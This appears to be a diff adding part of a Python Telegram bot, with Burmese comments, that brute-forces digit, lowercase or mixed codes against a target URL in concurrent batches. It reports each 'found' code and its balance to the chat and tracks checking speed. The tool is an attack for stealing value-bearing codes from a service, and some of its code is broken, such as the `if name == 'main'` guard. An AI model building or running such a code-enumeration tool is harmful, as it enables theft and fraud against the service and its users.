@@ -1,0 +1,94 @@
+elif data == "main_menu":
+        await show_main_menu(update, context)
+
+# ── BACKGROUND SCAN TASK ────────────────────────────────────────────────
+
+async def run_scan_task(user_id, context, chat_id, message_id):
+    state = user_scans[user_id]
+    mode = state['mode']
+    
+    if mode.startswith("mixed"):
+        code_iter = iter_mixed(int(mode.replace("mixed", "")))
+    elif mode.startswith("lower"):
+        code_iter = iter_lowercase(int(mode.replace("lower", "")))
+    else:
+        code_iter = iter_digit_codes(mode)
+
+    sem = asyncio.Semaphore(MAX_CONCURRENT)
+
+    async def _worker(code):
+        async with sem:
+            if not state['running']:
+                return None
+            return await perform_check(state['url'], code)
+
+    last_update_time = time.time()
+
+    try:
+        while state['running']:
+            batch = [next(code_iter) for _ in range(BATCH_SIZE)]
+            results = await asyncio.gather(*[_worker(c) for c in batch])
+
+            for res in results:
+                if res:
+                    state['found_codes'].append(res)
+                    # Code တွေ့ပါက ချက်ချင်း Notification ပို့ပေးခြင်း
+                    await context.bot.send_message(
+                        chat_id=chat_id,
+                        text=f"🎉 Code သစ်တွေ့ရှိသည်!\n\n🔑 Code: {res['code']}\n{res['balance']}",
+                        parse_mode='Markdown'
+                    )
+
+            state['checked'] += len(batch)
+
+            # ၅ စက္ကန့်တစ်ခါ Telegram Progress Update လုပ်ပေးခြင်း
+            if time.time() - last_update_time > 5:
+                elapsed = time.time() - state['start_time']
+                speed = (state['checked'] / elapsed * 60) if elapsed > 0 else 0
+                
+                status_msg = (
+                    f"⚡ Scanning In Progress...\n\n"
+                    f"📊 Mode: {mode}\n"
+                    f"📦 Checked: {state['checked']:,}\n"
+                    f"⚡ Speed: {speed:,.0f} /min\n"
+                    f"✅ Found: {len(state['found_codes'])}\n"
+                    f"⏱ Time: {format_time(elapsed)}"
+                )
+                keyboard = [[InlineKeyboardButton("⏹️ ရပ်တန့်ရန်", callback_data="stop_scan")]]
+                try:
+                    await context.bot.edit_message_text(
+                        chat_id=chat_id,
+                        message_id=message_id,
+                        text=status_msg,
+                        reply_markup=InlineKeyboardMarkup(keyboard),
+                        parse_mode='Markdown'
+                    )
+                except Exception:
+                    pass
+                last_update_time = time.time()
+
+            await asyncio.sleep(0.1)
+
+    except asyncio.CancelledError:
+        pass
+    finally:
+        state['running'] = False
+
+# ── MAIN BOT RUNNER ──────────────────────────────────────────────────────
+
+async def post_init(application: Application):
+    global _connector
+    _connector = aiohttp.TCPConnector(limit=CONNECTION_LIMIT, enable_cleanup_closed=False)
+
+def main():
+    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
+
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CallbackQueryHandler(callback_handler))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+
+    print("🤖 Telegram Bot Starting (Admin Security Active)...")
+    app.run_polling()
+
+if name == 'main':
+    main()
